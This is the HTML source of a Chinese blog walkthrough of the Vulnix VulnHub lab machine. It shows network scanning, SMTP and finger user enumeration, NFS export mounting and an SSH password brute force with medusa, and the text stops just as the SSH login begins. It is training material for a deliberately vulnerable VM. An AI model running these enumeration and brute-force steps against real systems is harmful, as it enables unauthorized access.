@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：HackLAB: Vulnix发布日期：2012年9月10日 下载Vulnix.7z  Download: http:&#x2F;&#x2F;www.rebootuser.com&#x2F;wp-content&#x2F;uploads&#x2F;vulnix&#x2F;Vulnix.7z Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hacklab&#x2F;Vulnix.7z Download (Tor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[HackLAB-Vulnix]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：HackLAB: Vulnix发布日期：2012年9月10日 下载Vulnix.7z  Download: http:&#x2F;&#x2F;www.rebootuser.com&#x2F;wp-content&#x2F;uploads&#x2F;vulnix&#x2F;Vulnix.7z Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hacklab&#x2F;Vulnix.7z Download (Tor">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-04-15T03:24:37.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:50:39.528Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/","path":"2020/04/15/HackLAB-Vulnix/","title":"vulnhub靶机渗透[HackLAB-Vulnix]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[HackLAB-Vulnix] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-key%E6%AF%92%E5%8C%96%E4%BB%A5getshell"><span class="nav-number">6.</span> <span class="nav-text">ssh key毒化以getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">知识点总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[HackLAB-Vulnix] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[HackLAB-Vulnix]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-04-15 11:24:37" itemprop="dateCreated datePublished" datetime="2020-04-15T11:24:37+08:00">2020-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:50:39" itemprop="dateModified" datetime="2020-08-17T00:50:39+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：HackLAB: Vulnix<br>发布日期：2012年9月10日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Vulnix.7z</p>
+<ul>
+<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvdnVsbml4L1Z1bG5peC43eg==">http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43eg==">https://download.vulnhub.com/hacklab/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43ei50b3JyZW50">https://download.vulnhub.com/hacklab/Vulnix.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>在这里，有一台易受攻击的Linux主机，它具有配置方面的缺陷，而不是有目的的易受攻击的软件版本（无论如何，在发布之时！）该主机基于Ubuntu Server 12.04，并于2012年9月上旬进行了全面修补。详细信息如下：</p>
+<p>架构：x86<br>格式：VMware（vmx＆vmdk）从版本4开始兼容<br>内存：512MB<br>网络：NAT<br>提取大小：820MB<br>压缩（下载大小）：194MB – 7zip格式– 7zip可从此处获得<br>MD5 Vulnix哈希值7z：0bf19d11836f72d22f30bf52cd585757<br>从此处下载Vulnix-</p>
+<p>目标;引导，查找IP，破解并获得隐藏在&#x2F;root中的flag-通过任何想要的方式-不包括对vmdk的实际破解如果有任何问题&#x2F;意见，请使用下面的评论部分免费联系。</p>
+<p>请享用！</p>
+<p>资料来源：<span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS8/cD05MzM=">http://www.rebootuser.com/?p=933<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.18</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:6C:D6:66 (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.18</span></span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">79/tcp    open  finger     Linux fingerd</span><br><span class="line">110/tcp   open  pop3?</span><br><span class="line">111/tcp   open  rpcbind    2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">143/tcp   open  imap       Dovecot imapd</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>       netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl    2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">39832/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">42471/tcp open  status     1 (RPC <span class="comment">#100024)</span></span><br><span class="line">45506/tcp open  nlockmgr   1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">52840/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">53613/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br></pre></td></tr></table></figure>
+
+<p>如所见，对于某些用户枚举来说，有一些开放的端口可能很有趣：25（smtp），79（finger）和111（rpcbind）。开始做一些手动尝试来获取端口25（smtp）上的用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.66.18 25</span></span><br><span class="line">Trying 192.168.66.18...</span><br><span class="line">Connected to 192.168.66.18.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">ehlo server</span><br><span class="line">250-vulnix</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250 DSN</span><br><span class="line">vrfy root</span><br><span class="line">252 2.0.0 root</span><br><span class="line">vrfy admin</span><br><span class="line">550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy user</span><br><span class="line">252 2.0.0 user</span><br><span class="line">vrfy administrator</span><br><span class="line">550 5.1.1 &lt;administrator&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy vulnix</span><br><span class="line">252 2.0.0 vulnix</span><br></pre></td></tr></table></figure>
+
+<p>在系统上找到3个用户：root，user和vulnix。继续使用finger进行一些研究：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># finger @192.168.66.18</span></span><br><span class="line">No one logged on.</span><br><span class="line">root@kali:~<span class="comment"># finger root@192.168.66.18</span></span><br><span class="line">Login: root                             Name: root</span><br><span class="line">Directory: /root                        Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger user@192.168.66.18</span></span><br><span class="line">Login: user                             Name: user</span><br><span class="line">Directory: /home/user                   Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line"></span><br><span class="line">Login: dovenull                         Name: Dovecot login user</span><br><span class="line">Directory: /nonexistent                 Shell: /bin/false</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger vulnix@192.168.66.18</span></span><br><span class="line">Login: vulnix                           Name: </span><br><span class="line">Directory: /home/vulnix                 Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure>
+
+<p>有趣的是，该用户用户还具有用于Dovecot的虚拟用户，但没有登录。Dovecot是一个开源电子邮件服务器。这可能是有用的信息。</p>
+<p>服务rpcbind已打开。这对于执行一些RPC枚举很有用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.66.18</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    4   tcp    111  portmapper</span><br><span class="line">    100000    3   tcp    111  portmapper</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    4   udp    111  portmapper</span><br><span class="line">    100000    3   udp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  38458  status</span><br><span class="line">    100024    1   tcp  39760  status</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100227    2   tcp   2049</span><br><span class="line">    100227    3   tcp   2049</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100227    2   udp   2049</span><br><span class="line">    100227    3   udp   2049</span><br><span class="line">    100021    1   udp  47060  nlockmgr</span><br><span class="line">    100021    3   udp  47060  nlockmgr</span><br><span class="line">    100021    4   udp  47060  nlockmgr</span><br><span class="line">    100021    1   tcp  50245  nlockmgr</span><br><span class="line">    100021    3   tcp  50245  nlockmgr</span><br><span class="line">    100021    4   tcp  50245  nlockmgr</span><br><span class="line">    100005    1   udp  47351  mountd</span><br><span class="line">    100005    1   tcp  50825  mountd</span><br><span class="line">    100005    2   udp  42195  mountd</span><br><span class="line">    100005    2   tcp  55764  mountd</span><br><span class="line">    100005    3   udp  38349  mountd</span><br><span class="line">    100005    3   tcp  38329  mountd</span><br></pre></td></tr></table></figure>
+
+<p>现在确定NFS正在侦听端口2049&#x2F;tcp和2049&#x2F;udp。现在是时候进行一些NFS枚举了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.66.18</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.66.18:</span><br><span class="line">/home/vulnix *</span><br></pre></td></tr></table></figure>
+
+<p>这意味着可以从任何主机访问共享。因此将该共享的位置安装在本地计算机上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># mount 192.168.66.18:/home/vulnix /root/vulnhub/vulnix</span></span><br><span class="line">root@kali:~/vulnhub<span class="comment"># cd vulnix</span></span><br><span class="line">bash: <span class="built_in">cd</span>: vulnix: 权限不够</span><br></pre></td></tr></table></figure>
+
+<p>但是当尝试访问该文件夹时，检索到拒绝访问。尝试更改访问权限，但检索到相同的错误。认为root squashing已启用，因为去过由该VM的创建者开办的培训课程，经常提到要使其保持启用状态。</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>至此，决定暴力破解已检索用户的密码。创建一个文件，收集所有用户（没有用户dovenull，没有登录访问权限）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># cat user.txt </span></span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">vulnix</span><br></pre></td></tr></table></figure>
+
+<p>然后使用字典列表rockyou.txt破解密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># medusa -h 192.168.66.18 -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64</span></span><br></pre></td></tr></table></figure>
+
+<p>终于破解了用户user的密码，即letmein。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh user@192.168.66.18</span></span><br><span class="line">The authenticity of host <span 